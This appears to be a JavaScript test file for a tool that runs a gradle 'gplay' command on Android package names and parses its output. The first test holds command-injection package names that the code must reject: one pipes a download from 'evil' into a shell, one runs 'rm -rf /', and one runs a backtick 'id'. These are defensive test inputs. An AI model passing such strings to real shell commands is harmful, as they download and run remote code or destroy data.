import { test } from 'node:test';
import assert from 'node:assert/strict';

import { parseGplayLine, runGplay } from '../src/gplay.js';

test('runGplay refuses package names that are not plain android package names', () => {
  // Hints arrive over the network; the gradle command runs through a shell
  // where $(...) and backticks expand, so anything but a plain package name
  // must be refused before it can reach the command line.
  const options = { gradlew: 'gradlew', projectRoot: '.' };

  assert.throws(() => runGplay(['com.a$(curl evil|sh)'], options), /unsafe package name/);
  assert.throws(() => runGplay(['com.a;rm -rf /'], options), /unsafe package name/);
  assert.throws(() => runGplay(['com.a`id`'], options), /unsafe package name/);
  assert.throws(() => runGplay(['com.a b'], options), /unsafe package name/);
  assert.throws(() => runGplay(['nodots'], options), /unsafe package name/);
});

test('parses a successful gplay output line', () => {
  const result = parseGplayLine(
    'com.whatsapp\tavailable=true\tsubscribed=false\tversionCode=262307413\tname=WhatsApp Messenger',
  );

  assert.equal(result.packageName, 'com.whatsapp');
  assert.equal(result.available, true);
  assert.equal(result.subscribed, false);
  assert.equal(result.versionCode, 262307413);
  assert.equal(result.name, 'WhatsApp Messenger');
  assert.equal(result.error, undefined);
});

test('parses an error line as an error result', () => {
  const result = parseGplayLine('com.foo\tERROR NullPointerException: boom');

  assert.equal(result.packageName, 'com.foo');
  assert.equal(result.error, 'NullPointerException: boom');
  assert.equal(result.available, undefined);
});

test('parses available=null (no testing program) as null, not undefined', () => {
  const result = parseGplayLine(
    'com.plain\tavailable=null\tsubscribed=null\tversionCode=5\tname=Plain App',
  );

  assert.equal(result.available, null);
  assert.equal(result.error, undefined);
});

test('returns null for non-data lines', () => {
  assert.equal(parseGplayLine('AUTH OK: authenticated as x'), null);
  assert.equal(parseGplayLine(''), null);
});

test('strips a trailing carriage return from Windows line endings', () => {
  const result = parseGplayLine('com.a\tavailable=true\tsubscribed=false\tversionCode=1\tname=App A\r');

  assert.equal(result.name, 'App A');
});
